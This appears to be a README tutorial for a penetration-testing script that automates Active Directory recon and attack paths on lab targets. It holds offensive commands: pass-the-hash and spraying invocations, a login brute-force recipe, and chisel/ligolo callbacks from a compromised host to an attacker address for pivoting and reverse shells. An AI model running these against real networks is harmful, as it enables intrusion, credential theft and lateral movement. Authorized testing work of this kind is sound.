# Enumerator
Automated recon &amp; enumeration tool. From nothing do Domain Admin.

enumerator.sh — Command-Line Tutorial


Authorized testing only. This tool is for machines you own or have explicit
written permission to test (HTB/PG labs, your own range, sanctioned engagements).



enumerator.sh is an fscan-driven Active Directory recon aggregator. It runs the
same tools you'd run by hand — fscan, NetExec (nxc), ldapsearch, impacket,
BloodHound, certipy, hashcat, ffuf/feroxbuster, nuclei, etc. — but orchestrates them,
routes by open port, collects loot, and (in auth mode) builds a BloodHound attack
path with copy-ready commands.


1. What you need

It assumes a normal Kali / pentest box with the usual tools on $PATH. The script
degrades gracefully — if a tool is missing it skips that step and tells you. The
tools it will use if present:

fscan, netexec/nxc, ldapsearch, impacket-* (secretsdump.py,
GetUserSPNs.py, GetNPUsers.py, …), bloodhound-python, certipy, bloodyAD,
targetedKerberoast.py, hashcat/john, ffuf/feroxbuster, nuclei, nikto,
sqlmap, testssl.sh/sslscan, hydra, kerbrute, enum4linux-ng, rpcclient,
smbclient, evil-winrm, and for pivoting proxychains4 + chisel/ligolo-ng.

bashchmod +x enumerator.sh
./enumerator.sh --usage      # built-in help, any time


2. The two modes

ModeInvocationWhat it doesUnauthenticated./enumerator.sh --unauth <ip>Sweep + per-service checks with no creds (anon SMB/LDAP/FTP, web, AS-REP roast, null sessions…).Authenticated./enumerator.sh --auth <ip> -u <user> -p <pass> -d <domain>Everything above plus credentialed LDAP, share loot, BloodHound collection + attack-path analysis, ADCS/certipy, Kerberoast, LAPS/gMSA/GPP, NTDS, flags.

bash# Quick anonymous look at a host
./enumerator.sh --unauth 10.10.10.10

# Full credentialed AD sweep
./enumerator.sh --auth 10.129.230.181 -u support -p 'Ironside47pleasure40Watchful' -d support.htb

Authenticated mode needs -u and one of -p / -H. -d <domain> is needed for
LDAP/Kerberos-heavy work.


3. How a run is structured (4 phases)

PHASE 1  PORT DISCOVERY      fscan, all 65535 TCP ports (no nmap)
PHASE 2  PER-SERVICE ENUM    each open port routed to its handler
PHASE 3  VULNERABILITY LEADS zerologon/nopac/petitpotam, ADCS, spray (with --aggressive)
PHASE 4  SUMMARY             _SUMMARY.txt + prioritized leads + attack path

Port → handler routing (so you know what each open port triggers):

PortsHandler21FTP (anon login, loot download)22 / 23SSH / Telnet25 / 465 / 587SMTP (user enum)53DNS (zone transfer, SRV)88Kerberos (AS-REP roast, kerbrute)80 / 443 / 8000 / 8080 / 8443 / 8888HTTP/S (tech, fuzz, vuln)110 / 995POP3111 / 2049NFS (showmount, mount)135 / 593MSRPC139 / 445SMB (shares, signing, RID, loot)143 / 993IMAP161SNMP389 / 636 / 3268 / 3269LDAP (dump, BloodHound, ADCS, trusts)1433MSSQL3306MySQL3389RDP5985 / 5986WinRM (evil-winrm, flags)6379Redis


4. Where the output goes

Everything lands in a timestamped folder in your current directory:

enum_<ip>_<YYYYMMDD_HHMMSS>/
├── _SUMMARY.txt        # human-readable summary + prioritized LEADS / NEXT STEPS
├── _commands.log       # every command the script ran (audit trail)
├── scans/              # raw fscan output
├── services/           # per-service full tool output (smb.txt, ldap.txt, web_80.txt…)
└── loot/               # creds, hashes, downloaded shares/FTP, BloodHound JSON,
                        # bh_analysis.txt (the attack path), adcs_analysis.txt, flags…

Read these first, in order: _SUMMARY.txt (top) → the LEADS / NEXT STEPS block →
loot/bh_analysis.txt (auth mode; this is the privesc playbook) → loot/adcs_analysis.txt.

By default the terminal is compact (only headers/leads/findings on screen); full tool
output is written to services/*.txt. Add -v/--verbose to stream everything live.


5. Full flag reference

Target / mode

FlagMeaning--unauth <ip>Unauthenticated sweep--auth <ip>Authenticated sweep (needs -u + -p/-H)

Credentials

FlagMeaning-u <user>Username-p <pass>Cleartext password-H <nthash>NT hash (pass-the-hash) instead of -p-d <domain>AD domain (e.g. support.htb)-kUse Kerberos auth for impacket/nxc--localLocal auth (--local-auth) instead of domain

Pivot / proxy

FlagMeaning--pivot chiselMark that traffic egresses a SOCKS proxy--proxy-addr <url>SOCKS proxy, e.g. socks5://127.0.0.1:1080

Scope / behavior

FlagMeaning--aggressiveDisruptive checks: zerologon/nopac/petitpotam, Coercer, password & cred spray--services <list> / --only <list>Run only these handlers, e.g. smb,ldap,kerberos (use web for HTTP)--all-servicesRun every handler (the default)--no-webSkip the HTTP/web handler entirely--no-web-bruteSkip web content discovery (ffuf/feroxbuster)--no-web-fuzzSkip ffuf dir/vhost/parameter fuzzing--web-vulnsOWASP-style web testing (nikto, nuclei vuln tags, TLS, LFI; sqlmap when --aggressive)--no-bloodhoundSkip BloodHound collection + analysis (auth)--no-flagsBox-build mode — do not hunt for user.txt/root.txt--no-loot-sharesDon't auto-download readable SMB shares--no-loot-ftpDon't auto-download anonymous FTP

Wordlists / cracking / brute

FlagDefault--web-wordlist <f>seclists raft-medium directories--vhost-wordlist <f>seclists subdomains top-5000--param-wordlist <f>burp-parameter-names--login-path <p> + --login-userlist <f> + --login-passlist <f> + --login-failstr <s>HTTP login brute (only runs when path + both lists set)--spray-wordlist <f>seclists top-1000 (password spray)--spray-forceSpray full list even if a lockout policy exists (DANGEROUS)--crack-wordlist <f>rockyou--crack-timeout <s>600s per crack job

Output

FlagMeaning-v / --verboseStream full tool output to the terminal--usage / -h / --helpShow help


Lockout safety: the spray and the flag-hunting login attempts are
lockout-aware by default — they back off when a lockout policy is detected.
--spray-force overrides that. Use it only when you know the policy.




6. Recipes (common workflows)

bash# 1) First contact, unknown host, no creds
./enumerator.sh --unauth 10.10.10.10

# 2) Full authenticated AD assessment (the bread-and-butter)
./enumerator.sh --auth 10.129.230.181 -u support \
  -p 'Ironside47pleasure40Watchful' -d support.htb

# 3) Pass-the-hash instead of a password
./enumerator.sh --auth 10.129.230.181 -u administrator \
  -H 'aad3b435b51404eeaad3b435b51404ee:<nthash>' -d corp.local

# 4) Kerberos auth (e.g. after kinit / with a ccache)
export KRB5CCNAME=/tmp/user.ccache
./enumerator.sh --auth dc01.corp.local -u user -p pass -d corp.local -k

# 5) Box-build mode — enumerate but DON'T grab flags (clean lab work)
./enumerator.sh --auth 10.129.230.181 -u support -p 'pass' -d support.htb --no-flags

# 6) Aggressive AD run (adds zerologon/nopac/petitpotam + password spray)
./enumerator.sh --auth 10.129.230.181 -u support -p 'pass' -d support.htb --aggressive

# 7) Only specific services
./enumerator.sh --auth 10.129.230.181 -u support -p 'pass' -d support.htb \
  --services smb,ldap,kerberos

# 8) Web-focused, with full OWASP vuln testing
./enumerator.sh --unauth 10.10.11.20 --services web --web-vulns

# 9) HTTP login brute against a form
./enumerator.sh --unauth 10.10.11.20 --services web \
  --login-path /login.php \
  --login-userlist users.txt \
  --login-passlist /usr/share/wordlists/rockyou.txt \
  --login-failstr 'Invalid'

# 10) Custom spray + crack lists
./enumerator.sh --auth 10.129.230.181 -u support -p 'pass' -d support.htb \
  --aggressive --spray-wordlist mylist.txt --crack-wordlist rockyou.txt


7. Reading the results


_SUMMARY.txt — open ports, per-service one-liners, and a LEADS / NEXT STEPS
block. Leads are prioritized: [!!] critical (often a privesc path), [!] notable,
[+] good-to-have. Each lead points at the file with the detail and a suggested next command.
loot/bh_analysis.txt (auth) — the attack-path playbook. For each object you can
abuse (a computer like DC$, a user, or a group) it prints the route(s) to take —
Shadow Credentials, RBCD, Targeted Kerberoast, force-reset, add-self-to-group, DCSync —
with exact commands (certipy/nxc/impacket/bloodyAD) and a HackTricks link. It also
lists “credentials you hold” and what each can do.
loot/adcs_analysis.txt — vulnerable certificate templates (ESC1/2/3/4/6/7/8/…) with
the certipy request → auth → pass-the-hash chain for each.
loot/ also holds: valid_creds.txt, hashes/NTDS dumps, candidate_secrets_*,
ldap_interesting_*, downloaded shares/ and FTP content, BloodHound *.json, and
flags_* (unless --no-flags).



8. Pivoting — reaching an internal subnet

Once you've popped a foothold host, you usually need to run recon against an internal
network the foothold can see but your Kali box cannot. There are two clean ways to do
this. The tool is pivot-aware: fscan, ffuf, feroxbuster and nuclei get the SOCKS
proxy natively, and libc tools (nxc, ldapsearch, impacket, …) are wrapped with
proxychains4 -q per call.


⚠️ Never launch enumerator.sh itself under proxychains (e.g.
proxychains4 ./enumerator.sh …). It preloads per-tool and a preloaded orchestrator
stack-smashes. The script even refuses to run if it detects proxychains in
LD_PRELOAD. Use --pivot chisel / --proxy-addr instead.



Option A — chisel (reverse SOCKS5 proxy)

Best when you want a SOCKS proxy and can't (or don't want to) touch routing.

bash# 1) On YOUR Kali box — start a chisel server in reverse mode
./chisel server -p 9001 --reverse
#    (listens on 9001; the agent will dial back to it)

# 2) On the COMPROMISED foothold host — connect back and expose a SOCKS5 listener
#    on your Kali at 127.0.0.1:1080
./chisel client YOUR_KALI_IP:9001 R:1080:socks

# 3) On Kali — run the tool through that SOCKS proxy
./enumerator.sh --auth 172.16.1.20 -u jdoe -p 'Winter2025!' -d corp.local \
  --pivot chisel --proxy-addr socks5://127.0.0.1:1080

What the tool does with that: fscan/ffuf/ferox/nuclei get -proxy/-x/-p socks5://…
directly; everything else is auto-prefixed with proxychains4 -q. You don't need to edit
/etc/proxychains4.conf for the tool — but if you run a one-off command yourself, add
the matching line socks5 127.0.0.1 1080 to that file and prefix with proxychains4 -q.

Option B — ligolo-ng (TUN tunnel — the smoothest)

ligolo-ng gives you a routed TUN interface, so internal IPs become reachable like any
other route — no SOCKS, no proxychains, and you run the tool completely normally.

bash# 1) On Kali — create + bring up the ligolo TUN interface (one-time)
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up

# 2) On Kali — start the ligolo proxy (listens on 11601)
./proxy -selfcert

# 3) On the COMPROMISED host — run the agent, dialling back to Kali
./agent -connect YOUR_KALI_IP:11601 -ignore-cert
#    (Windows: agent.exe -connect YOUR_KALI_IP:11601 -ignore-cert)

# 4) In the ligolo proxy console — select the session and start the tunnel
ligolo-ng » session          # pick the agent that just connected
ligolo-ng » start            # tunnel is up

# 5) On Kali — route the internal subnet through the ligolo interface
sudo ip route add 172.16.1.0/24 dev ligolo

# 6) Run the tool NORMALLY — no proxy flags needed, traffic is routed transparently
./enumerator.sh --auth 172.16.1.20 -u jdoe -p 'Winter2025!' -d corp.local

To catch reverse shells / relays back through the tunnel, add a ligolo listener:

bashligolo-ng » listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444   # agent:4444 -> your Kali:4444

Which to use?

chiselligolo-ngMechanismSOCKS5 proxyRouted TUN interfaceTool invocation--pivot chisel --proxy-addr socks5://127.0.0.1:1080normal (just ip route add)proxychains needed for ad-hoc toolsyesnoUDP / ICMPTCP onlyworks (TUN)Multi-hopchain clientsstart per agent + per-subnet routes

Pivoting tips


fscan over a pivot is slow (it still scans all 65535 TCP). Ping is auto-disabled over
SOCKS. If it drags, narrow scope with --services and let fscan find the obvious ports,
or pre-seed known ports.
SOCKS is TCP-only. Anything needing UDP/ICMP (some Kerberos/DNS edge cases) is happier
over ligolo's TUN.
Double pivot: ligolo handles it natively — start a second agent from a deeper host and
add another ip route. With chisel, chain a second client through the first SOCKS.
DNS: for AD work over a pivot, point the box at the internal DC for name resolution, or
use IPs and pass -d <domain> explicitly so Kerberos/LDAP still work.



9. Troubleshooting

SymptomFix“requires -u / -p”Auth mode needs -u and one of -p/-H.A tool’s step is skippedThat tool isn’t installed/on $PATH; install it or ignore.Script refuses to start (proxychains)Don’t wrap it in proxychains — use --pivot/--proxy-addr.Accounts getting lockedDrop --spray-force; the default backs off on lockout policy.Too noisy on screenDefault is already compact; check services/*.txt for full output. Add -v only when debugging.Slow over a pivotSee pivoting tips; prefer ligolo TUN; narrow --services.


Use it only where you're authorized. Everything it runs is logged to _commands.log so
you have a complete audit trail of the engagement.
